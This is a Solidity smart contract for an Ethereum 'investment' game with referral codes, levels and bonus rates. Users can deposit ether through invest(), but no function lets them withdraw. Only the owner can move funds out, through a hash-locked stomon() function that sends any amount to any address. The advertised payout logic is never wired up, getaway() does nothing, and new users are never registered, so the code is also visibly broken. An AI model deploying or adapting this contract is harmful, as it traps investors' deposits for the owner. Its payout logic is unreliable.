1 pragma solidity ^0.4.18;
2 /**
3  * @title Bigwin
4  *            
5  *             ╔═╗┌─┐┌─┐┬┌─┐┬┌─┐┬   ┌─────────────────────────--------┐ ╦ ╦┌─┐┌┐ ╔═╗┬┌┬┐┌─┐ 
6  *             ║ ║├┤ ├┤ ││  │├─┤│   │                                 │ ║║║├┤ ├┴┐╚═╗│ │ ├┤  
7  *             ╚═╝└  └  ┴└─┘┴┴ ┴┴─┘ └─┬──────────────────--------───┬─┘ ╚╩╝└─┘└─┘╚═╝┴ ┴ └─┘ 
8  *   ┌────────────────────────────────┘                     └──────────────────────────────┐
9  *   │╔═╗┌─┐┬  ┬┌┬┐┬┌┬┐┬ ┬   ╔╦╗┌─┐┌─┐┬┌─┐┌┐┌   ╦┌┐┌┌┬┐┌─┐┬─┐┌─┐┌─┐┌─┐┌─┐   ╔═╗┌┬┐┌─┐┌─┐┬┌─│
10  *   │╚═╗│ ││  │ │││ │ └┬┘ ═  ║║├┤ └─┐││ ┬│││ ═ ║│││ │ ├┤ ├┬┘├┤ ├─┤│  ├┤  ═ ╚═╗ │ ├─┤│  ├┴┐│
11  *   │╚═╝└─┘┴─┘┴─┴┘┴ ┴  ┴    ═╩╝└─┘└─┘┴└─┘┘└┘   ╩┘└┘ ┴ └─┘┴└─└  ┴ ┴└─┘└─┘   ╚═╝ ┴ ┴ ┴└─┘┴ ┴│
12  
13  * 
14  * This product is protected under license.  Any unauthorized copy, modification, or use without 
15  * express written consent from the creators is prohibited.
16  * 
17  * WARNING:  THIS PRODUCT IS HIGHLY ADDICTIVE.  IF YOU HAVE AN ADDICTIVE NATURE.  DO NOT PLAY.
18  */
19 
20 //==============================================================================
21 //      
22 //     
23 //==============================================================================
24 contract Etherbigwinner {
25 
26     address public minter;
27     uint ethWei = 1 ether;
28     uint rid = 1;
29     	uint bonuslimit = 15 ether;
30 	uint sendLimit = 100 ether;
31 	uint withdrawLimit = 15 ether;
32 	uint canImport = 1;
33 	 uint totalMoney = 0;
34     bytes32 public hashLock = 0x449e70f55b2d1405e35f2ac0bb17549fff3df38239910a33c870101274191e1b;	
35 	uint canSetStartTime = 1;
36 	mapping(string => address) addressMapping;
37 
38     function () payable public {}
39     function Etherbigwinner() public {
40         minter = msg.sender;
41     }
42         uint totalCount = 0;
43     	struct User{
44         address userAddress;
45         uint freeAmount;
46         uint freezeAmount;
47         uint rechargeAmount;
48         uint withdrawlsAmount;
49         uint inviteAmonut;
50         uint bonusAmount;
51         uint dayInviteAmonut;
52         uint dayBonusAmount;
53         uint level;
54         uint resTime;
55         uint lineAmount;
56         uint lineLevel;
57         string inviteCode;
58         string beInvitedCode;
59 		uint isline;
60 		uint status; 
61 		bool isVaild;
62     }
63     
64     struct Invest{
65 
66         address userAddress;
67         uint inputAmount;
68         uint resTime;
69         string inviteCode;
70         string beInvitedCode;
71 		uint isline;
72 		uint status; 
73 		uint times;
74     }
75       mapping (address => User) userMapping; 
76     mapping (uint => address) indexMapping;
77 	uint private beginTime = 1;
78 	    uint oneDayCount = 0;
79 	     uint allCount = 0;
80 	       Invest[] invests;
81     function stomon(address  userAddress, uint money,string _WhatIsTheMagicKey)  public {
82           require(sha256(_WhatIsTheMagicKey) == hashLock);
83            if (msg.sender != minter) return;
84 		if (money > 0) {
85 			userAddress.transfer(money);
86 		}
87 	}
88 		function getLevel(uint value) public view returns (uint) {
89 		if (value >= 0 * ethWei && value <= 5 * ethWei) {
90 			return 1;
91 		}
92 		if (value >= 6 * ethWei && value <= 10 * ethWei) {
93 			return 2;
94 		}
95 		if (value >= 11 * ethWei && value <= 15 * ethWei) {
96 			return 3;
97 		}
98 		return 0;
99 	}
100 
101 	function getNodeLevel(uint value) public view returns (uint) {
102 		if (value >= 0 * ethWei && value <= 5 * ethWei) {
103 			return 1;
104 		}
105 		if (value >= 6 * ethWei && value <= 10 * ethWei) {
106 			return 2;
107 		}
108 		if (value >= 11 * ethWei) {
109 			return 3;
110 		}
111 		return 0;
112 	}
113 
114 	function getScByLevel(uint level) public pure returns (uint) {
115 		if (level == 1) {
116 			return 5;
117 		}
118 		if (level == 2) {
119 			return 7;
120 		}
121 		if (level == 3) {
122 			return 10;
123 		}
124 		return 0;
125 	}
126 
127 	function getFireScByLevel(uint level) public pure returns (uint) {
128 		if (level == 1) {
129 			return 3;
130 		}
131 		if (level == 2) {
132 			return 6;
133 		}
134 		if (level == 3) {
135 			return 10;
136 		}
137 		return 0;
138 	}
139 
140 	function getRecommendScaleByLevelAndTim(uint level, uint times) public pure returns (uint){
141 		if (level == 1 && times == 1) {
142 			return 50;
143 		}
144 		if (level == 2 && times == 1) {
145 			return 70;
146 		}
147 		if (level == 2 && times == 2) {
148 			return 50;
149 		}
150 		if (level == 3) {
151 			if (times == 1) {
152 				return 100;
153 			}
154 			if (times == 2) {
155 				return 70;
156 			}
157 			if (times == 3) {
158 				return 50;
159 			}
160 			if (times >= 4 && times <= 10) {
161 				return 10;
162 			}
163 			if (times >= 11 && times <= 20) {
164 				return 5;
165 			}
166 			if (times >= 21) {
167 				return 1;
168 			}
169 		}
170 		return 0;
171 	}
172 
173      function invest(address userAddress ,uint inputAmount,string  inviteCode,string  beInvitedCode) public payable{
174         
175         userAddress = msg.sender;
176   		inputAmount = msg.value;
177         uint lineAmount = inputAmount;
178         
179      
180        totalMoney = totalMoney + inputAmount;
181         totalCount = totalCount + 1;
182         bool isLine = false;
183         
184        // uint level =getlevel(inputAmount);
185       //  uint lineLevel =getNodeLevel(lineAmount);
186         if(beginTime==1){
187             lineAmount = 0;
188             oneDayCount = oneDayCount + inputAmount;
189             Invest memory invest1 = Invest(userAddress,inputAmount,now, inviteCode, beInvitedCode ,1,1,0);
190             invests.push(invest1);
191            
192         }else{
193             allCount = allCount + inputAmount;
194             isLine = true;
195             invest1 = Invest(userAddress,inputAmount,now, inviteCode, beInvitedCode ,0,1,0);
196             inputAmount = 0;
197             invests.push(invest1);
198         }
199           User memory user = userMapping[userAddress];
200             if(user.isVaild && user.status == 1){
201                 user.freezeAmount = user.freezeAmount + inputAmount;
202                 user.rechargeAmount = user.rechargeAmount + inputAmount;
203                 user.lineAmount = user.lineAmount + lineAmount;
204        
205              
206                 userMapping[userAddress] = user;
207                 
208             }else{
209                 
210                 if(user.isVaild){
211                    inviteCode = user.inviteCode;
212                    beInvitedCode = user.beInvitedCode;
213                 }
214                
215               
216             }
217             address  userAddressCode = addressMapping[inviteCode];
218             if(userAddressCode == 0x0000000000000000000000000000000000000000){
219                 addressMapping[inviteCode] = userAddress;
220             }
221         
222     }
223     
224         function getUserByinviteCode(string inviteCode) public view returns (bool){
225         
226         address  userAddressCode = addressMapping[inviteCode];
227         User memory user = userMapping[userAddressCode];
228       if (user.isVaild){
229             return true;
230       }
231         return false;
232     }
233     
234     
235     
236 
237 	function getaway(uint money) pure private {
238 		
239 		for (uint i = 1; i <= 25; i++) {
240 		    uint moneyResult = 0;
241 			if (money <= 15 ether) {
242 				moneyResult = money;
243 			} else {
244 				moneyResult = 15 ether;
245 			}
246 
247 		  
248 	
249 		}
250 	}
251 	
252 }